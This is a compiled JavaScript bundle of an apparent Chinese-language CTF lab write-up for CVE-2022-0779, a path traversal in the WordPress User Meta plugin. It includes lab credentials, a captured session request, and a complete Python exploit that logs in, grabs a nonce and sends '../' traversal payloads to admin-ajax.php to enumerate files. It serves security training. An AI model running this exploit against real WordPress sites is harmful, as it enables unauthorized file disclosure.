"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[80068],{29392:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>t,toc:()=>c});const t=JSON.parse('{"id":"Independent-Environment/CVE/CVE-2022-0779/index","title":"CVE-2022-0779","description":"Tags","source":"@site/docs/Independent-Environment/CVE/CVE-2022-0779/index.md","sourceDirName":"Independent-Environment/CVE/CVE-2022-0779","slug":"/Independent-Environment/CVE/CVE-2022-0779/","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2022-0779/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Independent-Environment/CVE/CVE-2022-0779/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Independent_Environment_Sidebar","previous":{"title":"CVE-2022-0543","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2022-0543/"},"next":{"title":"CVE-2022-24223","permalink":"/Target-Machines-WriteUp/docs/Independent-Environment/CVE/CVE-2022-24223/"}}');var i=r(74848),s=r(28453);const a={},o="CVE-2022-0779",l={},c=[];function p(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,s.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.header,{children:(0,i.jsx)(n.h1,{id:"cve-2022-0779",children:"CVE-2022-0779"})}),"\n",(0,i.jsxs)(n.admonition,{type:"info",children:[(0,i.jsx)(n.p,{children:"Tags"}),(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"wordpress \u63d2\u4ef6 User Meta \u672c\u5730\u6587\u4ef6\u679a\u4e3e"}),"\n"]}),(0,i.jsx)(n.p,{children:"\u5b98\u65b9\u6570\u636e\u5e93\u8bb0\u5f55"}),(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:"2.4.4 \u4e4b\u524d\u7684 User Meta WordPress \u63d2\u4ef6\u4e0d\u4f1a\u9a8c\u8bc1\u5176 um_show_uploaded_file AJAX \u64cd\u4f5c\u7684\u6587\u4ef6\u8def\u5f84\u53c2\u6570\uff0c\u8fd9\u53ef\u80fd\u5141\u8bb8\u4f4e\u6743\u9650\u7528\u6237\uff08\u4f8b\u5982\u8ba2\u9605\u8005\uff09\u901a\u8fc7\u8def\u5f84\u904d\u5386\u8d1f\u8f7d\u679a\u4e3e Web \u670d\u52a1\u5668\u4e0a\u7684\u672c\u5730\u6587\u4ef6"}),"\n",(0,i.jsx)(n.p,{children:"User Meta \u672c\u5730\u6587\u4ef6\u679a\u4e3e\u3002flag \u751f\u6210\u89c4\u5219\u8bf7\u8bbf\u95ee 1.txt\u3002\u8d26\u6237\u4fe1\u606f\uff1atest"}),"\n"]})]}),"\n",(0,i.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,i.jsx)(n.a,{href:"https://wpscan.com/vulnerability/9d4a3f09-b011-4d87-ab63-332e505cf1cd/",children:"User Meta < 2.4.4 \u2013 Subscriber+ Local File Enumeration via Path Traversal | CVE 2022-0779 | Plugin Vulnerabilities"})]}),"\n",(0,i.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,i.jsx)(n.code,{children:"http://eci-2zed7yu7fshvsqv7qv3v.cloudeci1.ichunqiu.com/1.txt"})," \u83b7\u53d6 flag \u751f\u6210\u89c4\u5219"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"flag \u7684\u8def\u5f84\u4e3a http://ip/ + \u968f\u673a\u5b57\u7b26\u4e32\n\n\u957f\u5ea6\u4e3a 10\uff0c\u5c0f\u5199\u5b57\u6bcd + \u6570\u5b57\n\n\u8be5\u968f\u673a\u5b57\u7b26\u4e32\u5728 /flagfile \u76ee\u5f55\u4e0b\u6709\u5907\u4efd\uff0c\u547d\u540d\u89c4\u5219\u5982\u4e0b\uff1a\n\n\u5982\u968f\u673a\u5b57\u7b26\u4e32\u4e3a 12345admin\uff0c\u90a3\u5176\u5728 /flagfile \u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u4e3a\uff1a\n\n01\n12\n23\n34\n45\n5a\n6d\n7m\n8i\n9n\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,i.jsx)(n.code,{children:"test:test"})," \u767b\u5f55 Wordpress \u7684\u540e\u53f0 ",(0,i.jsx)(n.code,{children:"http://eci-2zed7yu7fshvsqv7qv3v.cloudeci1.ichunqiu.com/wp-login.php"})]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"img",src:r(9436).A+"",width:"2559",height:"1371"})}),"\n",(0,i.jsx)(n.p,{children:"\u83b7\u53d6\u5230\u767b\u5f55\u540e\u7684\u8bf7\u6c42\u53c2\u6570"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"GET /wp-admin/index.php HTTP/1.1\nHost: eci-2zed7yu7fshvsqv7qv3v.cloudeci1.ichunqiu.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nReferer: http://eci-2zed7yu7fshvsqv7qv3v.cloudeci1.ichunqiu.com/wp-admin/\nDNT: 1\nConnection: keep-alive\nCookie: wordpress_d8f4bdf7c62ddfe0cbe24ae6b6d5e410=test%7C1721986213%7CXwsz4QFoETnlFHCtKjTAcqROncqMOv4cesddBVEE94I%7Cf2b1fe78d121e6aef7d9a93c4a6bc1f719d91436d33d62b4518ac7e71a32ad46; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_d8f4bdf7c62ddfe0cbe24ae6b6d5e410=test%7C1721986213%7CXwsz4QFoETnlFHCtKjTAcqROncqMOv4cesddBVEE94I%7C09bcfa1c494b6e1d93e31dbfa71948dc2b940f9d6ab994aa0e577a78a759308c; wp-settings-time-2=1721813415\nUpgrade-Insecure-Requests: 1\nPriority: u=0, i\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7ed3\u5408 poc \u4fe1\u606f\uff0c\u5c1d\u8bd5\u5229\u7528"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'import requests\nimport string\nfrom urllib.parse import urlparse\n\n\nreq_arg_url = "http://eci-2ze2dtnd1qw9c9h330sc.cloudeci1.ichunqiu.com/"\n\nreq_arg_cookies_text = requests.post(\n    f"{urlparse(req_arg_url).scheme}://{urlparse(req_arg_url).netloc}/wp-login.php",\n    data={"log": "test", "pwd": "test", "wp-submit": "%E7%99%BB%E5%BD%95", "testcookie": 1},\n).headers.get("Set-Cookie")\n\nreq_arg_cookies_list = [i.replace("HttpOnly, ", "").replace("", "").strip() for i in req_arg_cookies_text.split("; ")]\nreq_arg_cookies_list = [i for i in req_arg_cookies_list if (i.startswith("wordpress_"))]\nreq_arg_cookies = "; ".join((req_arg_cookies_list))\n\nreq_headers_pf_nonce = {\n    "Host": f"{urlparse(req_arg_url).netloc}",\n    "Accept-Language": "zh-CN",\n    "Upgrade-Insecure-Requests": "1",\n    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",\n    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",\n    "Accept-Encoding": "gzip, deflate, br",\n    "Cookie": f"{req_arg_cookies}",\n    "Connection": "keep-alive",\n}\n\nreq_arg_pf_nonce_raw = requests.get(\n    f"{urlparse(req_arg_url).scheme}://{urlparse(req_arg_url).netloc}/wp-admin/index.php", headers=req_headers_pf_nonce\n)\nreq_arg_pf_nonce_raw = [i for i in req_arg_pf_nonce_raw.text.split("\\n") if "pf_nonce" in i][0].split("\'")\n\nfor i in range(len(req_arg_pf_nonce_raw)):\n    if "pf_nonce=" in req_arg_pf_nonce_raw[i]:\n        req_arg_pf_nonce = req_arg_pf_nonce_raw[i + 1]\n        break\n\n\ndef func(filepath: str, host=urlparse(req_arg_url).netloc) -> str:\n    reqUrl = f"http://{host}/wp-admin/admin-ajax.php"\n    headersList = {\n        "Host": f"{host}",\n        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",\n        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",\n        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",\n        "Accept-Encoding": "gzip, deflate",\n        "Referer": f"http://{host}/wp-admin/admin-ajax.php",\n        "Content-Type": "application/x-www-form-urlencoded",\n        "Content-Length": "173",\n        "Origin": f"http://{host}",\n        "DNT": "1",\n        "Connection": "keep-alive",\n        "Cookie": f"{req_arg_cookies}",\n        "Upgrade-Insecure-Requests": "1",\n        "Priority": "u=0, i",\n    }\n    payload = f"field_name=test&filepath=%2F..%2F..%2F..%2F..%2F..%2F..%2F..{filepath}&field_id=um_field_4&form_key=Upload&action=um_show_uploaded_file&pf_nonce={req_arg_pf_nonce}&is_ajax=true"\n    response = requests.request("POST", reqUrl, data=payload, headers=headersList)\n    return response.text\n\n\nfilename_result = ""\n\ntry:\n    from rich.progress import Progress\n\n    with Progress() as progress:\n        first_progress = progress.add_task("[green]First letter Loop...", total=10)\n        for first_letter in range(10):\n            second_progress = progress.add_task("[cyan]Second letter Loop...", total=len(string.digits + string.ascii_letters))\n            for second_letter in string.digits + string.ascii_letters:\n                file_name = str(first_letter) + str(second_letter)\n                file_path = f"/flagfile/{file_name}"\n                if "um_remove_file" in func(file_path):\n                    print("[+] " + file_name)\n                    filename_result += file_name[1]\n                    break\n                progress.update(second_progress, advance=1)\n            progress.update(first_progress, advance=1)\n            progress.remove_task(second_progress)\nexcept:\n    for first_letter in range(10):\n        for second_letter in string.digits + string.ascii_letters:\n            file_name = str(first_letter) + str(second_letter)\n            print(file_name)\n            file_path = f"/flagfile/{file_name}"\n            if "um_remove_file" in func(file_path):\n                print("[+] " + file_name)\n                filename_result += file_name[1]\n                break\n\nprint(f"[+] flag_path: {filename_result.lower()}")\nflag_url = f"{urlparse(req_arg_url).scheme}://{urlparse(req_arg_url).netloc}/{filename_result.lower()}"\nprint(f"[+] flag_url: {flag_url}")\n# debug\nprint(requests.get(flag_url).status_code)\nprint(requests.get(flag_url).text)\nif requests.get(flag_url).status_code == 200:\n    print("[+] flag: {flag_data}".format(flag_data=requests.get(flag_url)))\nelse:\n    print("[!] Something error")\n'})})]})}function d(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(p,{...e})}):p(e)}},9436:(e,n,r)=>{r.d(n,{A:()=>t});const t=r.p+"assets/images/image_20240730-173046-ab2b13063c61bf209b4e8101dda7bc24.png"},28453:(e,n,r)=>{r.d(n,{R:()=>a,x:()=>o});var t=r(96540);const i={},s=t.createContext(i);function a(e){const n=t.useContext(s);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:a(e.components),t.createElement(s.Provider,{value:n},e.children)}}}]);